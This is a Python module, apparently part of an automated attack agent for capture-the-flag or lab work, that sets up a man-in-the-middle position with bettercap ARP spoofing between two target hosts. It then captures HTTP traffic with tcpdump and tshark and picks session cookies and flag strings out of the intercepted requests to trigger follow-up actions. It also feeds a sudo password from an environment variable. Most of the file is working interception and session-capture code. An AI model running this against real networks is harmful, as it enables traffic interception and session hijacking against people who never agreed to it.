from __future__ import annotations

import json
import os
import re
import shutil
import signal
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Any

from configs.config import (
    ENABLE_MONITORING,
    MONITOR_BETTERCAP_INTERNAL,
    MONITOR_FLAG_REGEX,
    MONITOR_INTERFACE,
    MONITOR_POLL_INTERVAL_SECONDS,
    MONITOR_PORT,
    MONITOR_TARGETS,
    MONITOR_TRIGGER_EVENT_TYPES,
    MONITOR_USE_BETTERCAP,
    MONITOR_USE_TCPDUMP,
    MONITOR_VERBOSE,
)
from core.memory import append_monitor_event
from core.workspace import (
    get_active_experiment_id,
    get_monitor_jsonl_path,
    get_monitor_pcap_path,
    get_monitor_signal_path,
    get_monitor_state_path,
)


def _now() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def _append_jsonl(path: Path, payload: dict[str, Any]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("a", encoding="utf-8") as f:
        f.write(json.dumps(payload, ensure_ascii=False) + "\n")


def _write_json(path: Path, payload: dict[str, Any]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")


def _read_json(path: Path, default: dict[str, Any]) -> dict[str, Any]:
    if not path.exists():
        return default

    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except Exception:
        return default


def _read_state() -> dict[str, Any]:
    return _read_json(
        get_monitor_state_path(),
        {
            "seen_event_keys": [],
            "seen_flags": [],
        },
    )


def _save_state(state: dict[str, Any]) -> None:
    _write_json(get_monitor_state_path(), state)


def _read_signal_state(experiment_id: str | None = None) -> dict[str, Any]:
    return _read_json(
        get_monitor_signal_path(experiment_id),
        {
            "updated_at": None,
            "pending": [],
        },
    )


def _save_signal_state(state: dict[str, Any], experiment_id: str | None = None) -> None:
    _write_json(get_monitor_signal_path(experiment_id), state)


def _run_command(command: list[str], timeout: int = 10) -> tuple[int, str, str]:
    try:
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=timeout,
            input=None,
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired as exc:
        return 124, exc.stdout or "", exc.stderr or "timeout"
    except Exception as exc:
        return 1, "", str(exc)


def _run_command_with_input(
    command: list[str],
    stdin_data: str | None = None,
    timeout: int = 10,
) -> tuple[int, str, str]:
    try:
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=timeout,
            input=stdin_data,
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired as exc:
        return 124, exc.stdout or "", exc.stderr or "timeout"
    except Exception as exc:
        return 1, "", str(exc)


def _get_sudo_password() -> str | None:
    password = os.environ.get("D_AGENT_SUDO_PASSWORD", "")
    return password if password else None


def _build_sudo_command(command: list[str]) -> tuple[list[str], str | None]:
    password = _get_sudo_password()
    if password:
        return ["sudo", "-S", "-p", ""] + command, password + "\n"
    return ["sudo", "-n"] + command, None


def _run_sudo_command(command: list[str], timeout: int = 10) -> tuple[int, str, str]:
    sudo_command, stdin_data = _build_sudo_command(command)
    return _run_command_with_input(sudo_command, stdin_data=stdin_data, timeout=timeout)


def _spawn_sudo_process(command: list[str], **kwargs: Any) -> subprocess.Popen:
    sudo_command, stdin_data = _build_sudo_command(command)
    use_pipe = stdin_data is not None
    proc = subprocess.Popen(
        sudo_command,
        stdin=subprocess.PIPE if use_pipe else subprocess.DEVNULL,
        **kwargs,
    )
    if use_pipe and proc.stdin is not None:
        proc.stdin.write(stdin_data)
        proc.stdin.flush()
        proc.stdin.close()
    return proc


def _sudo_available() -> tuple[bool, str]:
    returncode, _, stderr = _run_sudo_command(["-k", "true"], timeout=3)
    if returncode == 0:
        return True, ""
    return False, stderr.strip() or "sudo non-interactive authentication is unavailable"


def _decode_http_file_data(raw_body: str) -> str:
    clean_body = raw_body.strip()
    if not clean_body:
        return ""

    decoded_parts: list[str] = []
    for chunk in clean_body.split(","):
        candidate = chunk.strip()
        if not candidate:
            continue

        if re.fullmatch(r"[0-9A-Fa-f:\s]+", candidate):
            hex_candidate = re.sub(r"[^0-9A-Fa-f]", "", candidate)
            if len(hex_candidate) >= 2 and len(hex_candidate) % 2 == 0:
                try:
                    decoded = bytes.fromhex(hex_candidate).decode("utf-8", errors="ignore")
                except ValueError:
                    decoded = ""
                if decoded:
                    decoded_parts.append(decoded)
                    continue

        decoded_parts.append(candidate)

    return "\n".join(part for part in decoded_parts if part).strip()


def get_local_monitor_dir() -> Path:
    experiment_id = get_active_experiment_id()
    local_dir = Path("/tmp/d_agent_pcap") / experiment_id
    local_dir.mkdir(parents=True, exist_ok=True)
    return local_dir


def get_local_monitor_pcap_path() -> Path:
    return get_local_monitor_dir() / "mitm_capture.pcap"


def copy_local_pcap_to_runtime() -> None:
    local_pcap = get_local_monitor_pcap_path()
    runtime_pcap = get_monitor_pcap_path()

    if not local_pcap.exists():
        _append_jsonl(
            get_monitor_jsonl_path(),
            {
                "time": _now(),
                "type": "pcap_copy_skipped",
                "reason": "local pcap does not exist",
                "local_pcap": str(local_pcap),
                "runtime_pcap": str(runtime_pcap),
            },
        )
        return

    runtime_pcap.parent.mkdir(parents=True, exist_ok=True)

    try:
        shutil.copyfile(local_pcap, runtime_pcap)
        _append_jsonl(
            get_monitor_jsonl_path(),
            {
                "time": _now(),
                "type": "pcap_copied",
                "local_pcap": str(local_pcap),
                "runtime_pcap": str(runtime_pcap),
                "size_bytes": runtime_pcap.stat().st_size,
            },
        )
    except Exception as exc:
        _append_jsonl(
            get_monitor_jsonl_path(),
            {
                "time": _now(),
                "type": "pcap_copy_failed",
                "local_pcap": str(local_pcap),
                "runtime_pcap": str(runtime_pcap),
                "error": str(exc),
            },
        )


def _build_bettercap_eval() -> str:
    if len(MONITOR_TARGETS) < 2:
        raise ValueError("MONITOR_TARGETS must contain at least two hosts")

    left = MONITOR_TARGETS[0]
    right = MONITOR_TARGETS[1]
    targets = ",".join(MONITOR_TARGETS)

    commands = [
        "arp.spoof off",
        f"set arp.spoof.internal {'true' if MONITOR_BETTERCAP_INTERNAL else 'false'}",
        f"set arp.spoof.targets {targets}",
        "arp.spoof on",
        f'set net.sniff.filter "host {left} and host {right} and port {MONITOR_PORT}"',
        f"set net.sniff.verbose {'true' if MONITOR_VERBOSE else 'false'}",
        "net.sniff on",
    ]

    return "; ".join(commands)


def start_bettercap_monitor() -> subprocess.Popen | None:
    if not ENABLE_MONITORING or not MONITOR_USE_BETTERCAP:
        return None

    sudo_ok, sudo_error = _sudo_available()
    if not sudo_ok:
        _append_jsonl(
            get_monitor_jsonl_path(),
            {
                "time": _now(),
                "type": "monitor_permission_error",
                "tool": "bettercap",
                "error": sudo_error,
            },
        )
        append_monitor_event(f"bettercap start skipped: {sudo_error}")
        return None

    _run_sudo_command(["sysctl", "-w", "net.ipv4.ip_forward=1"], timeout=5)

    eval_script = _build_bettercap_eval()

    command = [
        "bettercap",
        "-iface",
        MONITOR_INTERFACE,
        "-eval",
        eval_script,
    ]

    _append_jsonl(
        get_monitor_jsonl_path(),
        {
            "time": _now(),
            "type": "bettercap_start",
            "interface": MONITOR_INTERFACE,
            "targets": MONITOR_TARGETS,
            "port": MONITOR_PORT,
            "command": " ".join(command),
        },
    )

    append_monitor_event(
        f"bettercap MITM started: targets={MONITOR_TARGETS}, port={MONITOR_PORT}"
    )

    return _spawn_sudo_process(
        command,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        text=True,
        preexec_fn=os.setsid,
    )


def start_tcpdump_capture() -> subprocess.Popen | None:
    if not ENABLE_MONITORING or not MONITOR_USE_TCPDUMP:
        return None

    if len(MONITOR_TARGETS) < 2:
        raise ValueError("MONITOR_TARGETS must contain at least two hosts")

    sudo_ok, sudo_error = _sudo_available()
    if not sudo_ok:
        _append_jsonl(
            get_monitor_jsonl_path(),
            {
                "time": _now(),
                "type": "monitor_permission_error",
                "tool": "tcpdump",
                "error": sudo_error,
            },
        )
        append_monitor_event(f"tcpdump start skipped: {sudo_error}")
        return None

    pcap_path = get_local_monitor_pcap_path()
    pcap_path.parent.mkdir(parents=True, exist_ok=True)

    left = MONITOR_TARGETS[0]
    right = MONITOR_TARGETS[1]

    # 초기 디버깅용: 대상 서버 7587 트래픽 전체를 잡음.
    # 이러면 Kali에서 직접 curl로 만든 트래픽도 잡힙니다.
    bpf_filter = f"host {right} and port {MONITOR_PORT}"

    # MITM으로 B-C 사이 트래픽만 엄격하게 보고 싶으면 위 줄 대신 아래 줄 사용.
    # bpf_filter = f"host {left} and host {right} and port {MONITOR_PORT}"

    command = [
        "tcpdump",
        "-i",
        MONITOR_INTERFACE,
        "-U",
        "-w",
        str(pcap_path),
        bpf_filter,
    ]

    _append_jsonl(
        get_monitor_jsonl_path(),
        {
            "time": _now(),
            "type": "tcpdump_start",
            "interface": MONITOR_INTERFACE,
            "filter": bpf_filter,
            "local_pcap": str(pcap_path),
            "runtime_pcap": str(get_monitor_pcap_path()),
            "command": " ".join(command),
        },
    )

    append_monitor_event(
        f"tcpdump capture started: filter={bpf_filter}, local_pcap={pcap_path}"
    )

    return _spawn_sudo_process(
        command,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        text=True,
        preexec_fn=os.setsid,
    )


def start_live_tshark_monitor() -> subprocess.Popen | None:
    if not ENABLE_MONITORING or not MONITOR_USE_TCPDUMP:
        return None

    if shutil.which("tshark") is None:
        _append_jsonl(
            get_monitor_jsonl_path(),
            {
                "time": _now(),
                "type": "monitor_dependency_error",
                "tool": "tshark",
                "error": "tshark is not installed",
            },
        )
        append_monitor_event("live tshark monitor skipped: tshark is not installed")
        return None

    sudo_ok, sudo_error = _sudo_available()
    if not sudo_ok:
        _append_jsonl(
            get_monitor_jsonl_path(),
            {
                "time": _now(),
                "type": "monitor_permission_error",
                "tool": "tshark",
                "error": sudo_error,
            },
        )
        append_monitor_event(f"live tshark monitor skipped: {sudo_error}")
        return None

    right = MONITOR_TARGETS[1]
    bpf_filter = f"host {right} and port {MONITOR_PORT}"
    command = [
        "tshark",
        "-l",
        "-i",
        MONITOR_INTERFACE,
        "-f",
        bpf_filter,
        "-o",
        "tcp.desegment_tcp_streams:true",
        "-o",
        "http.desegment_body:true",
        "-Y",
        "http",
        "-T",
        "fields",
        "-e",
        "frame.number",
        "-e",
        "ip.src",
        "-e",
        "ip.dst",
        "-e",
        "http.request.method",
        "-e",
        "http.request.uri",
        "-e",
        "http.response.code",
        "-e",
        "http.location",
        "-e",
        "http.cookie",
        "-e",
        "http.set_cookie",
        "-e",
        "http.file_data",
        "-E",
        "separator=|",
    ]

    _append_jsonl(
        get_monitor_jsonl_path(),
        {
            "time": _now(),
            "type": "tshark_live_start",
            "interface": MONITOR_INTERFACE,
            "filter": bpf_filter,
            "command": " ".join(command),
        },
    )
    append_monitor_event(f"live tshark monitor started: filter={bpf_filter}")

    return _spawn_sudo_process(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
        preexec_fn=os.setsid,
    )


def stop_process_group(proc: subprocess.Popen | None) -> None:
    if proc is None:
        return

    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        proc.wait(timeout=5)
    except Exception:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except Exception:
            pass


def stop_bettercap_monitor(proc: subprocess.Popen | None) -> None:
    stop_process_group(proc)

    _run_sudo_command(["sysctl", "-w", "net.ipv4.ip_forward=0"], timeout=5)
    _run_sudo_command(["ip", "neigh", "flush", "all"], timeout=5)

    _append_jsonl(
        get_monitor_jsonl_path(),
        {
            "time": _now(),
            "type": "bettercap_stop",
        },
    )

    append_monitor_event("bettercap MITM stopped and network cleanup was executed.")


def analyze_pcap_once() -> list[dict[str, Any]]:
    pcap_path = get_local_monitor_pcap_path()

    if not pcap_path.exists() or pcap_path.stat().st_size == 0:
        return []

    command = [
        "tshark",
        "-r",
        str(pcap_path),
        "-o",
        "tcp.desegment_tcp_streams:true",
        "-o",
        "http.desegment_body:true",
        "-Y",
        f"tcp.port == {MONITOR_PORT} && (http.request || http.response)",
        "-T",
        "fields",
        "-e",
        "frame.number",
        "-e",
        "ip.src",
        "-e",
        "ip.dst",
        "-e",
        "http.request.method",
        "-e",
        "http.request.uri",
        "-e",
        "http.response.code",
        "-e",
        "http.location",
        "-e",
        "http.cookie",
        "-e",
        "http.set_cookie",
        "-e",
        "http.file_data",
        "-E",
        "separator=|",
    ]

    returncode, stdout, stderr = _run_command(command, timeout=15)

    if returncode != 0:
        _append_jsonl(
            get_monitor_jsonl_path(),
            {
                "time": _now(),
                "type": "pcap_analysis_error",
                "pcap": str(pcap_path),
                "stderr": stderr.strip(),
            },
        )
        return []

    flag_regex = re.compile(MONITOR_FLAG_REGEX, re.IGNORECASE)
    events: list[dict[str, Any]] = []

    for raw_line in stdout.splitlines():
        raw_line = raw_line.strip()
        if not raw_line:
            continue

        parts = raw_line.split("|")
        while len(parts) < 10:
            parts.append("")

        (
            frame_no,
            src,
            dst,
            method,
            uri,
            status_code,
            location,
            cookie,
            set_cookie,
            body,
        ) = parts[:10]

        decoded_body = _decode_http_file_data(body)
        search_blob = "\n".join(part for part in [raw_line, body, decoded_body] if part)
        flags = sorted(set(flag_regex.findall(search_blob)))

        event_type = ""
        summary = ""

        if flags:
            event_type = "flag_observed"
            summary = f"flag candidate observed from traffic: {', '.join(flags)}"
        elif set_cookie and "session=" in set_cookie:
            event_type = "session_cookie_observed"
            summary = (
                f"session cookie observed: {src} -> {dst}, "
                f"status={status_code}, location={location}, set_cookie={set_cookie}"
            )
        elif cookie and "session=" in cookie:
            event_type = "session_cookie_used"
            summary = (
                f"session cookie used: {src} -> {dst}, "
                f"method={method}, uri={uri}, cookie={cookie}"
            )
        elif status_code == "302" or location:
            event_type = "http_redirect"
            summary = (
                f"HTTP redirect observed: {src} -> {dst}, "
                f"status={status_code}, location={location}"
            )
        elif method or uri:
            event_type = "http_request"
            summary = f"HTTP request observed: {src} -> {dst}, method={method}, uri={uri}"
        elif status_code:
            event_type = "http_response"
            summary = f"HTTP response observed: {src} -> {dst}, status={status_code}"

        if not event_type:
            continue

        events.append(
            {
                "time": _now(),
                "type": event_type,
                "frame": frame_no,
                "src": src,
                "dst": dst,
                "method": method,
                "uri": uri,
                "status_code": status_code,
                "location": location,
                "cookie": cookie,
                "set_cookie": set_cookie,
                "body": body,
                "decoded_body": decoded_body[:2000],
                "flags": flags,
                "summary": summary,
            }
        )

    return events


def parse_live_tshark_event(raw_line: str) -> dict[str, Any] | None:
    line = raw_line.strip()
    if not line:
        return None

    parts = line.split("|", 9)
    while len(parts) < 10:
        parts.append("")

    (
        frame_no,
        src,
        dst,
        method,
        uri,
        status_code,
        location,
        cookie,
        set_cookie,
        body,
    ) = parts[:10]

    decoded_body = _decode_http_file_data(body)
    flag_regex = re.compile(MONITOR_FLAG_REGEX, re.IGNORECASE)
    search_blob = "\n".join(part for part in [line, uri, body, decoded_body] if part)
    flags = sorted(set(flag_regex.findall(search_blob)))

    event_type = ""
    summary = ""

    if flags:
        event_type = "flag_observed"
        summary = f"flag candidate observed from traffic: {', '.join(flags)}"
    elif set_cookie and "session=" in set_cookie:
        event_type = "session_cookie_observed"
        summary = (
            f"session cookie observed: {src} -> {dst}, "
            f"status={status_code}, location={location}, set_cookie={set_cookie}"
        )
    elif cookie and "session=" in cookie:
        event_type = "session_cookie_used"
        summary = (
            f"session cookie used: {src} -> {dst}, "
            f"method={method}, uri={uri}, cookie={cookie}"
        )
    elif status_code == "302" or location:
        event_type = "http_redirect"
        summary = (
            f"HTTP redirect observed: {src} -> {dst}, "
            f"status={status_code}, location={location}"
        )
    elif method or uri:
        event_type = "http_request"
        summary = f"HTTP request observed: {src} -> {dst}, method={method}, uri={uri}"
    elif status_code:
        event_type = "http_response"
        summary = f"HTTP response observed: {src} -> {dst}, status={status_code}"

    if not event_type:
        return None

    return {
        "time": _now(),
        "type": event_type,
        "frame": frame_no,
        "src": src,
        "dst": dst,
        "method": method,
        "uri": uri,
        "status_code": status_code,
        "location": location,
        "cookie": cookie,
        "set_cookie": set_cookie,
        "body": body,
        "decoded_body": decoded_body[:2000],
        "flags": flags,
        "summary": summary,
    }


def build_event_key(event: dict[str, Any]) -> str:
    key_payload = {
        "type": event.get("type"),
        "frame": event.get("frame"),
        "src": event.get("src"),
        "dst": event.get("dst"),
        "method": event.get("method"),
        "uri": event.get("uri"),
        "status_code": event.get("status_code"),
        "location": event.get("location"),
        "flags": event.get("flags"),
    }
    return json.dumps(key_payload, ensure_ascii=False, sort_keys=True)


def should_trigger_action(event: dict[str, Any]) -> bool:
    if event.get("type") in MONITOR_TRIGGER_EVENT_TYPES:
        return True

    if event.get("flags"):
        return True

    return False


def queue_monitor_signal(event: dict[str, Any], experiment_id: str | None = None) -> None:
    state = _read_signal_state(experiment_id)
    pending = list(state.get("pending", []))
    event_key = build_event_key(event)

    if any(item.get("event_key") == event_key for item in pending):
        return

    signal_payload = {
        "created_at": _now(),
        "event_key": event_key,
        "event_type": event.get("type"),
        "summary": event.get("summary", ""),
        "flags": event.get("flags", []),
        "src": event.get("src", ""),
        "dst": event.get("dst", ""),
        "method": event.get("method", ""),
        "uri": event.get("uri", ""),
        "status_code": event.get("status_code", ""),
        "location": event.get("location", ""),
        "frame": event.get("frame", ""),
    }
    pending.append(signal_payload)
    state["updated_at"] = _now()
    state["pending"] = pending[-50:]
    state["last_queued_signal"] = signal_payload
    _save_signal_state(state, experiment_id)


def peek_monitor_signals(experiment_id: str | None = None, limit: int = 10) -> list[dict[str, Any]]:
    state = _read_signal_state(experiment_id)
    pending = list(state.get("pending", []))
    if limit <= 0:
        return pending
    return pending[:limit]


def claim_monitor_signal(
    experiment_id: str | None = None,
    event_key: str | None = None,
) -> dict[str, Any] | None:
    state = _read_signal_state(experiment_id)
    pending = list(state.get("pending", []))
    if not pending:
        return None

    signal_payload = None
    if event_key:
        for index, item in enumerate(pending):
            if item.get("event_key") == event_key:
                signal_payload = pending.pop(index)
                break

    if signal_payload is None:
        signal_payload = pending.pop(0)

    state["updated_at"] = _now()
    state["pending"] = pending
    state["last_claimed_at"] = _now()
    state["last_claimed_signal"] = signal_payload
    _save_signal_state(state, experiment_id)
    return signal_payload


def monitor_loop() -> None:
    bettercap_proc = None
    tshark_proc = None

    try:
        bettercap_proc = start_bettercap_monitor()
        tshark_proc = start_live_tshark_monitor()

        state = _read_state()
        seen_event_keys = set(state.get("seen_event_keys", []))
        seen_flags = set(state.get("seen_flags", []))

        if tshark_proc is None or tshark_proc.stdout is None:
            while True:
                _save_state(
                    {
                        "last_updated": _now(),
                        "seen_event_keys": list(seen_event_keys)[-500:],
                        "seen_flags": list(seen_flags),
                        "monitor_mode": "idle-no-live-capture",
                    }
                )
                time.sleep(MONITOR_POLL_INTERVAL_SECONDS)

        for raw_line in tshark_proc.stdout:
            event = parse_live_tshark_event(raw_line)
            if event is None:
                continue

            event_key = build_event_key(event)
            if event_key in seen_event_keys:
                continue

            seen_event_keys.add(event_key)
            _append_jsonl(get_monitor_jsonl_path(), event)

            summary = event.get("summary", "")
            if summary:
                append_monitor_event(summary)

            if should_trigger_action(event):
                queue_monitor_signal(event)
                append_monitor_event(
                    f"action trigger queued: type={event.get('type')}, summary={summary or '-'}"
                )

            for flag in event.get("flags", []):
                if flag not in seen_flags:
                    seen_flags.add(flag)
                    append_monitor_event(f"submit-ready flag candidate observed: {flag}")

            _save_state(
                {
                    "last_updated": _now(),
                    "seen_event_keys": list(seen_event_keys)[-500:],
                    "seen_flags": list(seen_flags),
                    "monitor_mode": "live-tshark",
                }
            )

        stderr_output = ""
        if tshark_proc.stderr is not None:
            stderr_output = tshark_proc.stderr.read().strip()
        _append_jsonl(
            get_monitor_jsonl_path(),
            {
                "time": _now(),
                "type": "tshark_live_stop",
                "returncode": tshark_proc.wait(timeout=1) if tshark_proc.poll() is not None else None,
                "stderr": stderr_output,
            },
        )

    except KeyboardInterrupt:
        pass
    finally:
        stop_process_group(tshark_proc)
        stop_bettercap_monitor(bettercap_proc)


def start_monitor_process(experiment_id: str, sudo_password: str | None = None) -> subprocess.Popen | None:
    if not ENABLE_MONITORING:
        return None

    env = os.environ.copy()
    env["D_AGENT_EXPERIMENT_ID"] = experiment_id
    if sudo_password:
        env["D_AGENT_SUDO_PASSWORD"] = sudo_password

    command = [
        sys.executable,
        "-m",
        "core.monitor",
    ]

    _append_jsonl(
        get_monitor_jsonl_path(experiment_id),
        {
            "time": _now(),
            "type": "monitor_process_start",
            "experiment_id": experiment_id,
            "command": " ".join(command),
        },
    )

    return subprocess.Popen(
        command,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        text=True,
        env=env,
    )


def stop_monitor_process(proc: subprocess.Popen | None) -> None:
    if proc is None:
        return

    try:
        proc.terminate()
        proc.wait(timeout=5)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass


if __name__ == "__main__":
    monitor_loop()
